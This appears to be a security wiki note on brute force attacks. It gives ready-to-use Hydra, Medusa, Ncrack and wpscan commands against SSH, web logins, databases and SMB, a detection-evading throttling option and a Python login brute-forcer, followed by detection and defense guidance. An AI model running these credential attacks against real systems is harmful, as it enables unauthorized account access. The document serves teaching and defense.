# Brute Force Attack

## Overview
A brute force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN) by systematically checking all possible combinations until the correct one is found.

## Types of Brute Force Attacks

### 1. Simple Brute Force
- **Method**: Try all possible combinations systematically
- **Target**: Short passwords, PINs
- **Time**: Can be very slow for long passwords

### 2. Dictionary Attack
- **Method**: Use common passwords and word lists
- **Target**: Weak passwords based on common words
- **Efficiency**: Much faster than simple brute force

### 3. Hybrid Attack
- **Method**: Combine dictionary words with numbers/symbols
- **Example**: password123, admin2024!
- **Target**: Passwords with predictable patterns

### 4. Reverse Brute Force
- **Method**: Use one common password against many usernames
- **Target**: Systems with common default passwords
- **Example**: admin/admin, root/toor

### 5. Credential Stuffing
- **Method**: Use leaked username/password combinations
- **Target**: Users who reuse passwords across services
- **Source**: Data breaches, credential dumps

## Common Targets

### Authentication Services
```bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://target-ip

# FTP brute force  
hydra -L users.txt -P passwords.txt ftp://target-ip

# HTTP basic auth
hydra -L users.txt -P passwords.txt http-get://target-ip/admin
```

### Web Applications
```bash
# Login forms
hydra -L users.txt -P passwords.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# WordPress
wpscan --url http://target.com --usernames users.txt --passwords passwords.txt
```

### Database Services
```bash
# MySQL
hydra -L users.txt -P passwords.txt mysql://target-ip

# MSSQL
hydra -L users.txt -P passwords.txt mssql://target-ip
```

### Network Services
```bash
# SMB/CIFS
hydra -L users.txt -P passwords.txt smb://target-ip

# Telnet
hydra -L users.txt -P passwords.txt telnet://target-ip
```

## Tools and Techniques

### Hydra
```bash
# Basic syntax
hydra -l username -P wordlist.txt service://target

# Multiple usernames and passwords
hydra -L users.txt -P passwords.txt service://target

# Throttling to avoid detection
hydra -L users.txt -P passwords.txt -t 4 -W 30 ssh://target
```

### Medusa
```bash
# Similar to Hydra
medusa -h target -U users.txt -P passwords.txt -M ssh

# With specific options
medusa -h target -u admin -P passwords.txt -M http -m DIR:/admin
```

### Ncrack
```bash
# SSH brute force
ncrack -p 22 --user root -P passwords.txt target-ip

# Multiple protocols
ncrack ssh://target:22 ftp://target:21 -U users.txt -P passwords.txt
```

### Custom Scripts
```python
import requests
import sys

def brute_force_login(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            
            if "Invalid" not in response.text:
                print(f"Success: {username}:{password}")
                return username, password
    return None, None
```

## Wordlists

### Common Wordlists
```bash
# Rockyou - Most popular
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/Common-Credentials/

# Custom wordlist generation
crunch 8 12 -f charset.lst mixalpha-numeric > passwords.txt
```

### Username Lists
```bash
# Common usernames
admin, administrator, root, user, test, guest, demo, service

# Generate from company info
./username-anarchy -i names.txt > usernames.txt
```

## Detection and Monitoring

### Log Analysis
```bash
# SSH failed attempts
grep "Failed password" /var/log/auth.log

# Web server logs
grep "POST /login" /var/log/apache2/access.log | grep "401"

# Windows Event Logs - Event ID 4625 (failed logon)
```

### Rate-based Detection
- **Multiple failed attempts** from same IP
- **Unusual login patterns** outside business hours
- **Geographic anomalies** in login locations
- **High volume** of authentication requests

## Defense Mechanisms

### Account Policies
```bash
# Account lockout after failed attempts
- Lockout threshold: 5-10 attempts
- Lockout duration: 15-30 minutes
- Reset counter: After successful login
```

### Rate Limiting
```nginx
# Nginx rate limiting
limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;

location /login {
    limit_req zone=login burst=5 nodelay;
}
```

### Strong Password Policies
- **Minimum length**: 12+ characters
- **Complexity requirements**: Upper, lower, numbers, symbols
- **Password history**: Prevent reuse of last 12 passwords
- **Regular rotation**: Every 90 days for sensitive accounts

### Multi-Factor Authentication (MFA)
- **Something you know**: Password
- **Something you have**: Token, phone
- **Something you are**: Biometrics

### Monitoring and Alerting
```python
# Example alert script
def check_failed_logins():
    failed_count = get_failed_login_count()
    if failed_count > THRESHOLD:
        send_alert(f"Brute force detected: {failed_count} failures")
        block_ip(source_ip)
```

## Related Topics
- [[Hydra]]
- [[Password cracking]]
- [[Multi-factor authentication]]
- [[Account lockout policies]]
- [[Rate limiting]]
- [[Web application security]]
